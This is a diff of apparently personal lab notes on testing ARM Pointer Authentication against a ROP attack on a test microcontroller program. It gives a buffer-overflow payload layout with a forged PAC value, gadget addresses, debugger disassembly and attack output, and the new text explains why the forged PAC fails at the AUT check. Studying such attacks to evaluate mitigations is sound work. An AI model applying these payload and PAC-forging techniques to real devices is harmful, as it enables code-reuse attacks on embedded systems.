@@ -208,6 +208,8 @@ PAC_KEY at 0: This refers to the Pointer Authentication keys (e.g., PAKeyLo/PAKe
 
 We can manually edit the PACEN and BTIEN to `0x01` during debug mode, before target function executing.
 
+> Note that, for our tests so far, BTIEN is not really relevant
+
 Now,
 
 ```
@@ -376,7 +378,7 @@ __STATIC_FORCEINLINE void __get_PAC_KEY_P (uint32_t* pPacKey) {
 
 Try to find some the patterns - because it is not real randomization
 
-#### Logs
+#### Debug of trival ROP attack
 
 Normal:
 
@@ -390,10 +392,10 @@ Then R12 - FEF778AE
 
 ROP:
 line 1:
-
-LR: 02003AB1
+```
+LR: 0x02003AB1
 SP: 0x22007670
-
+```
 Then R12 - 0x741e09d4
 
 This is the same as the last time computation - code reuse attack
@@ -415,9 +417,19 @@ Because the r12 is pushed first to the stack
 so we need a new payload as: `'A' * 16 + '0x741e09d4' + 'A' * 12 + ROP chain`,
 with little endian, so the '0x741e09d4' should be put as 'd4 09 e0 74'.
 
-#### Output
+#### Not really 1
 
-```
+Because the code is modified, so the `LR` at line 1 will be not always the same.
+For the new attack program, it becomes to `0x02003AB3`
+
+so the correct PAC value also changes to `0xf4e3f83a`. We need to use this as the new payload
+to overwrite R12.
+
+![alt text](image-8.png)
+
+#### Not really 2
+
+```shell
 === DEMO 3: ROP Attack (with PAC - Fake R12) ===
 [ATTACK] Preparing ROP chain...
 
@@ -426,31 +438,23 @@ with little endian, so the '0x741e09d4' should be put as 'd4 09 e0 74'.
   [1] gadget_leak_secret:  0x020037CD
   [2] gadget_dangerous_op: 0x02003715
   [3] gadget_exit:         0x02003755
-
-[ATTACK] Payload structure:
-  Bytes [00-15]: Buffer (16 bytes)
-  Bytes [16-19]: Overwrite r12
-  Bytes [20-23]: Overwrite r4
-  Bytes [24-27]: Overwrite r5
-  Bytes [28-31]: Overwrite r6
-  Bytes [32-35]: Overwrite pc with gadget_set_flag
-  Bytes [36-39]: gadget_leak_secret
-  Bytes [40-43]: gadget_dangerous_op
-  Bytes [44-47]: gadget_exit
-
-[ATTACK] Launching attack...
-================================================
-
-[VULN] Executing memcpy (48 bytes)...
-[VULN] Buffer at: 0x2200764C
-[VULN] Overflow complete, returning...
-
-[GADGET] Secret leaked: 0x12345678
-[GADGET] Executing dangerous operation!
-[GADGET] ROP chain completed. Changed privileged flag: 0xDEADBEEF
 ```
 
-The ROP successed!
+![alt text](image-9.png)
+
+```
+0x0200A860 B005      ADD      sp,sp,#0x14
+0x0200A862 F85DCB04  POP      {r12}        <--- pop 0xf4e3f83a to r12
+0x0200A866 E8BD4070  POP      {r4-r6,lr}   <--- 0x41414141 0x41414141 0x41414141 [0x02003805] 
+0x0200A86A F3AF802D  AUT      r12,lr,sp    <--- line 2
+0x0200A86E 4770      BX       lr
+```
+
+So the overwriting is as expected, but we forget one thing that, the line 2 `AUT` need to match the PAC
+for `lr` and `sp`. Now the PAC value is `0xf4e3f83a = PAC(0x02003AB3, 0x22007670)`, but our new lr is `0x02003805`. This `AUT` will surely fail.
+
+
+
 
 
 
